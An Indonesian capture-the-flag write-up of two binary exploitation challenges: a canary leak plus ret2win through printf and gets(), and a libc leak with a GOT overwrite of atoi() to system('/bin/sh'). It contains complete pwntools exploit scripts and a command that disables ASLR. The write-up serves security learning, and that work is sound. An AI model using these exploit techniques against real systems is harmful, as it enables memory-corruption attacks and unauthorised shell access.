---
title: 'Write Up 4 Chall Madness'
disqus: de13ugg1ng  
---

Write Up PWN LKSN 2026
===
Attachment -> DM `bagas7.` di discord.

## Daftar Isi
[TOC]

##  Challange 1 - another1

###    Deskripsi

RET2WIN

### TL; DR

Chall Ret2Win biasa. Terdapat 2 vulnerability, **Buffer Overflow** dari **gets()** dan **Address Leak** dari **printf()**. Dari checksec, **PIE disable** dan terdapat **canary**. Dan terdapat **win()** function yang melakukan `cat ./flag`. Jadi alur exploitnya adalah:

leak **address canary** -> **Buffer Overflow** -> RET ke **win()** -> dapat **flag**.

### Langkah Exploit

Pertama, check file Binary nya dengan **file** dan **checksec**.

![image](https://hackmd.io/_uploads/HyjxjJUUfe.png)

![image](https://hackmd.io/_uploads/ByZfjJILGl.png)

Binary not stripped, no PIE, dan terdapat canary. Dugaan sementara, harus leak canary untuk Buffer Overflow.

![image](https://hackmd.io/_uploads/S1nFokLUGx.png)

Setelah di cek dari IDA Pro. Ini adalah tipe chall menu, yang kita bisa pilih mau masuk kedalam function mana dengan input 1/2/3.

![image](https://hackmd.io/_uploads/rkfZhJULMx.png)

![image](https://hackmd.io/_uploads/HkbuhyUUMl.png)

Ditemukan vulnerability Leak Address dari input nomor 1. `printf(s)` Dimana **s** diambil dari fgets() di awal program.

![image](https://hackmd.io/_uploads/Hkd3nJ8UGx.png)

Dan ditemukan vulnerability Buffer Overflow dari input nomor 2. `gets(v7)`

![image](https://hackmd.io/_uploads/S1HgpJ8Uzl.png)

Permasalahannya sekarang, Saya butuh leak address dari v8 / canary. Karena untuk Overflow stack nya, kita perlu lolos dari pengecekan canary. So, harus timpa canary dengan nilai yang sama.

**FUZZING:**
```a
from pwn import *
context.log_level = 'error' #debug / info / warning / error / critical / notset


#FUZZING
for i in range(100):
    p = process("./chall")

    payload = f'%{i}$p'.encode()
    p.sendline(payload)
    p.sendline(b'1')
    p.recvuntil(b'Name:')
    hasil = p.recvuntil(b'Role:').replace(b'Role:',b'')
    p.recv(999)
    print('{'+str((i))+'}'+str(hasil.decode()))


gdb.attach(p,'''

''')

p.interactive()

# pwndbg> x/gx rsp
# 0x7ffcb36ae0d8: 0x0000563e591572b3
# REGEX Yang harus di hapalin untuk ngambil address: 
# teks_asli = hasil.decode(errors='ignore').strip()
# match = re.search(r'0x[0-9a-fA-F]+,0x[0-9a-fA-F]+', teks_asli)
# canary,baseleak = match.group(0).split(',')
```

![image](https://hackmd.io/_uploads/ryEECkU8Me.png)

![image](https://hackmd.io/_uploads/SyYECyI8Gx.png)

Pertama, lakukan fuzzing terlebih dahulu. Disini saya menemukan beberapa suspect offset yang kemungkinan adalah canary: **17 | 37**

![image](https://hackmd.io/_uploads/r1oj01U8fl.png)

![image](https://hackmd.io/_uploads/ByLnCyU8fx.png)

Ketemu, offset canary yang benar adalah `%37$p`. Selanjutnya, cari offset sampai ke RET. Menggunakan vuln **gets()**.

![image](https://hackmd.io/_uploads/Hyvp1xULGx.png)

Dari header, terdapat info bahwa size nya adalah 40. Lalu bawahnya langsung v8. Kemungkinan formatnya: **40 Char** - **canary** - **Saved RBP** - **RET**.

![image](https://hackmd.io/_uploads/HkyBbxIUGe.png)

Cek dulu. Pertama break di **0x00000000004013d5**, dibawahnya jmp ke main+579 yang isinya manggil chk_fail itu.

![image](https://hackmd.io/_uploads/HJVobg8IMg.png)

Run, lalu di input 2. saya isi dengan A*40 + AAAABBBB. Seharusnya **kalau benar**. Akan terlempar ke **chk_fail** dan perbandingan canary nya akan menunjuk ke AAAABBBB.

![image](https://hackmd.io/_uploads/SyrbfeIIfx.png)

![image](https://hackmd.io/_uploads/r1ymMeL8zx.png)

Dan benar. Disini masuk ke **chk_fail** dan **canary** di bandingkan dengan **AAAABBBB**. jadi struktur Stack nya yang valid adalah:

**buffer 40 bytes** -> **Canary** -> **Saved RBP** -> **RET**

![image](https://hackmd.io/_uploads/BJZWXx88Mg.png)

Jadi tinggal copy aja ini address win() :`0x00000000004011a6`. Lalu buat payload Ret2Win:

**b'A' x 40 + canary + b'B' x 8 + RET + Win Address**.

Kenapa ada **B x 8** dan **RET**? Karena Saved RBP itu nilai nya 8 byte. Dan dalam Binary file 64 bit, kadang overflow bisa membuat stack alignment tidak pas kelipatan 16.

**SOLVER:**

```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)


# %24$p



p.sendline(b'A'*8+b'%37$p')
p.sendline(b'1')
p.recvuntil(b'Name:')
hasil = p.recvuntil(b'Role:').replace(b'Role:',b'').replace(b'AAAAAAAA',b'')
hasil = int(hasil.decode(), 16)
p.recv(999)
print(hex(hasil))

payload = b'A' * 40
payload += p64(hasil)
payload += b'B'*8
payload += p64(0x000000000040101a)
payload += p64(0x00000000004011a6)

p.sendline(b'2')
p.sendline(payload)
p.sendline(b'3')
p.interactive()


# Exploit:
# # /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# python -c 'from pwn import * ; print(hex(u64(b'./flagdo')))'
```

![image](https://hackmd.io/_uploads/H1CK4xUIMl.png)

Yay, dapat Flag...


##  Challange 2 - another2

###    Deskripsi

GOT Overwrite

### TL; DR

Chall GOT Overwrite. Terdapat vulnerability address leak dari function **read_spell()** dan overwrite address dari function **write_spell()**. Untuk melakukan spawn shell, saya perlu address dari libc. Dengan cara **leak** salah satu **GOT** menggunakan **read_spell()**. Setelah mendapatkan GOT, hitung base libc. Dan cari address dari **system()** di dalam libc. Lalu saya lakukan trace untuk instruction yang sekiranya bisa di overwrite dan bisa berubah menjadi **system('/bin/sh')**. Disini terdapat 1 kandidat, yaitu **atoi()**. Jadi urutan exploitnya adalah:

Leak GOT -> Cari address **system()** -> Overwrite **GOT atoi()** untuk menunjuk ke address **system()** -> **spawn shell**.

### Langkah Exploit

Pertama, check file Binary nya dengan **file** dan **checksec**.

![image](https://hackmd.io/_uploads/SkbfBqLLMe.png)

![image](https://hackmd.io/_uploads/H1A7r5LUzg.png)

Waw, Hijau semua. Terdapat PIE, Canary, dan NX. Tapi **Partial RELRO**. So, memungkinkan banget untuk melakukan overwrite. Dan file nya juga **not stripped**.

![image](https://hackmd.io/_uploads/BJIk85IUGl.png)

Disini program define sebuah variable dengan nama spells. Kemungkinan ini variable bakal jadi patokan untuk melakukan **leak address**.

![image](https://hackmd.io/_uploads/H1oVI5U8Gg.png)

![image](https://hackmd.io/_uploads/r198LcUIGx.png)

Saya masuk ke **read_spell()** dulu. Disini dia memanggil **get_int()**.

![image](https://hackmd.io/_uploads/rkmZv5ULze.png)

Di dalam get_int() ada 2 function utama. **fgets()** dan **atoi()**. fgets akan meminta input dengan ukuran maksimal **0x20 char**. Lalu nilainya akan dirubah menjadi **int** oleh atoi.

![image](https://hackmd.io/_uploads/B1yYD5L8Gx.png)

Lalu kembali ke read_spell(), disini nilai hasil atoi akan disimpan ke **uVar1**. Addressnya di print oleh **printf()**. Tapi disini dia menggunakan (uint), dimana hanya akan print 4 byte saja. 

![image](https://hackmd.io/_uploads/SkTou9LLfg.png)

Karena **uint** akan **memaksa printf** untuk print addressnya sebagai **32 bit**. Dimana address program sendiri adalah **64 bit**. Jadi yang seharusnya **8 byte long**, hanya akan muncul **4 byte** saja.

![image](https://hackmd.io/_uploads/H1flPq8UMx.png)

Program bakal print addresnya ini dengan format hex langsung. Jadi gampang trace nya.

![image](https://hackmd.io/_uploads/r1lOtcLUzx.png)

Jadi cara leak address adalah dengan membuat nilai dari `spells + (long)(int)uVar1 * 4` agar menjadi address dari GOT. Pertama kita harus turunkan rumusnya dulu.

spells + (var1 * 4) = GOT -> **var1 = (GOT - spells)/4**

![image](https://hackmd.io/_uploads/BkbJicU8ze.png)

Cara paling cepat, kita hitung offset dari spells ke salah satu GOT.

![image](https://hackmd.io/_uploads/HyGUo5IUfl.png)

Disini saya pilih **GOT printf** untuk di leak.

![image](https://hackmd.io/_uploads/rkEisqULMg.png)

Jadi offset GOT ny adalah `-0x88`.

![image](https://hackmd.io/_uploads/H1aCh9LIze.png)


var1 = (GOT - spells) / 4  
var1 = -0x88 / 4  
var1 = -34

Kita coba read ke **-34**.

![image](https://hackmd.io/_uploads/ByxFfT98Lzl.png)

![image](https://hackmd.io/_uploads/HyLQa5LUGe.png)

Addressnya sama di bagian akhir, ...64300. Jadi valid. GOT ter leak tapi hanya bagian akhirnya saja. Bagian depannya seharusnya ada di -33.

![image](https://hackmd.io/_uploads/HkEKacI8Gl.png)

Oke, benar. Kalau saya gabung = **0x7f650xbb664300**. Itu ada 0x tambahan di tengah, hapus saja. Jadinya = **0x7f65bb664300**, ini adalah address valid dari GOT printf.

![image](https://hackmd.io/_uploads/S1gRAqULMl.png)

Untuk menghitung base libc, dari **leak GOT** dikurangi dengan **0x64300**.

```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall_patched'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

# offset GOT printf = 0x88
p.sendline(b'1')
p.recv()
p.sendline(b'-33')
p.recvuntil(b'(')
part1 = p.recvuntil(b')').strip().decode().replace(')','')


p.sendline(b'1')
p.recv()
p.sendline(b'-34')
p.recvuntil(b'(')
part2 = p.recvuntil(b')').strip().decode().replace(')','').replace('0x','')
print('part1: ',part1)
print('part2: ', part2)
got = f'{part1}' + f'{part2}'
got = int(got, 16)
base = got - 0x64300
print('GOT LEAK: ', hex(got))
print('BASE LIBC: ', hex(base))
```

![image](https://hackmd.io/_uploads/r13IA5LIfx.png)

Oke, hasilnya valid.

![image](https://hackmd.io/_uploads/r1HvJiLUMg.png)

Cari offset untuk instruction **system()** dari Binary File libc = `000000000005c560`.  
Jadi `base + 000000000005c560 = system()`

![image](https://hackmd.io/_uploads/SkZAZiUIGe.png)

![image](https://hackmd.io/_uploads/SkvPgsUIfx.png)

Setelah itu dari function **write_spell()** terdapat vulnerability overwrite address. Dimana `uVar2` akan overwrite nilai dari `*(uint *)(spells + (long)(int)uVar1 * 4)` atau bisa dibaca: `(uVar1 - spells) / 4`.

![image](https://hackmd.io/_uploads/HyQ3MiIIfg.png)

![image](https://hackmd.io/_uploads/H1nnGs88Mg.png)

Dari yang saya lihat. Overwrite ke **system()** yang memungkinkan adalah mengubah **atoi()** menjadi **system()**. Karena fgets akan menyimpan input kita ke **local_38** dan langsung diubah dengan **atoi(local_38)**. Jadi kalau local_38 diisi `/bin/sh` dan atoi diganti dengan system. Maka akan menjadi instruction `system("/bin/sh")` yang valid.

![image](https://hackmd.io/_uploads/B1chXsILMe.png)

Permasalahannya adalah overwrite hanya akan mengubah **32 bit / 4 byte** saja. Karena menggunakan **(uint)**. Dan kita tidak bisa melakukan **write 2x**, karena setelah mengubah 4 byte pertama. nilai atoi akan langsung berubah dan kalau addressnya tidak valid, atoi selanjutnya akan menghasilkan **segmentation failed** dari program.  

```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall_patched'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

# offset GOT printf = 0x88
p.sendline(b'1')
p.recv()
p.sendline(b'-33')
p.recvuntil(b'(')
part1 = p.recvuntil(b')').strip().decode().replace(')','')


p.sendline(b'1')
p.recv()
p.sendline(b'-34')
p.recvuntil(b'(')
part2 = p.recvuntil(b')').strip().decode().replace(')','').replace('0x','')
print('part1: ',part1)
print('part2: ', part2)
got = f'{part1}' + f'{part2}'
got = int(got, 16)
base = got - 0x64300
print('GOT LEAK: ', hex(got))
print('BASE LIBC: ', hex(base))
system = base + 0x00000000005c560
print('Address system: ', system)
# printf -> atoi offset  =+0x18, offset = -0x70 / 4 = -28

# 1. Ambil 4 byte bawah (Low DWORD)
low_dword = system & 0xFFFFFFFF
low_dword2 = (got + 0x18) & 0xFFFFFFFF
print('Address system #1: ', low_dword)
print('Address atoi: ', low_dword2)
# 2. Ambil 4 byte atas (High DWORD)
high_dword = (system >> 32) & 0xFFFFFFFF
high_dword2 = ((got + 0x18) >> 32) & 0xFFFFFFFF
print('Address system #2: ', high_dword)
print('Address atoi: ', high_dword2)
```

![image](https://hackmd.io/_uploads/HkvRVoLLfe.png)

Disini saya coba untuk print address menjadi 2 bagian Low dan High. **Low = Akhir**, **High = Awal**. Bisa dilihat, **address** yang berbeda hanya bagian **Low**. Jadi kita hanya perlu mengubah **4 byte terakhir** saja untuk overwrite **atoi()** menjadi **system()**.

![image](https://hackmd.io/_uploads/rJdJUs8Lfg.png)

![image](https://hackmd.io/_uploads/ryBbLjILMe.png)

Oke, jadi offsetnya adalah -28. Cek dulu.

![image](https://hackmd.io/_uploads/BkHXUjLUze.png)

![image](https://hackmd.io/_uploads/SyCX8sL8fx.png)

Valid ya. Jadi saya tinggal ganti saja **-28** menjadi **low** dari **system()** lewat write. Lalu setelah itu input `/bin/sh`.

```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall_patched'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

gdb.attach(p, gdbscript='''

''')

# offset GOT printf = 0x88
p.sendline(b'1')
p.recv()
p.sendline(b'-33')
p.recvuntil(b'(')
part1 = p.recvuntil(b')').strip().decode().replace(')','')


p.sendline(b'1')
p.recv()
p.sendline(b'-34')
p.recvuntil(b'(')
part2 = p.recvuntil(b')').strip().decode().replace(')','').replace('0x','')
print('part1: ',part1)
print('part2: ', part2)
got = f'{part1}' + f'{part2}'
got = int(got, 16)
base = got - 0x64300
print('GOT LEAK: ', hex(got))
print('BASE LIBC: ', hex(base))
system = base + 0x00000000005c560
print('Address system: ', system)
# printf -> atoi offset  =+0x18, offset = -0x70 / 4 = -28

# 1. Ambil 4 byte bawah (Low DWORD)
low_dword = system & 0xFFFFFFFF
low_dword2 = (got + 0x18) & 0xFFFFFFFF
print('Address system #1: ', hex(low_dword))
print('Address system #1: ', low_dword)
# 2. Ambil 4 byte atas (High DWORD)
high_dword = (system >> 32) & 0xFFFFFFFF
high_dword2 = ((got + 0x18) >> 32) & 0xFFFFFFFF
print('Address system #2: ', high_dword)
print('Address system #2: ', high_dword2)
# p.sendline(b'2')
# p.sendline(b'-27')
# p.sendline(f'{low_dword}'.encode())

p.sendline(b'2')
p.sendline(b'-28')
p.sendline(f'{low_dword}'.encode())

p.interactive()


# Exploit:
# # /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# python -c 'from pwn import * ; print(hex(u64(b'./flagdo')))'
```

![image](https://hackmd.io/_uploads/SycsLj88Mx.png)

![image](https://hackmd.io/_uploads/ryVhIiLIGg.png)

Yay, exploit berhasil. Dan saya mendapatkan shell
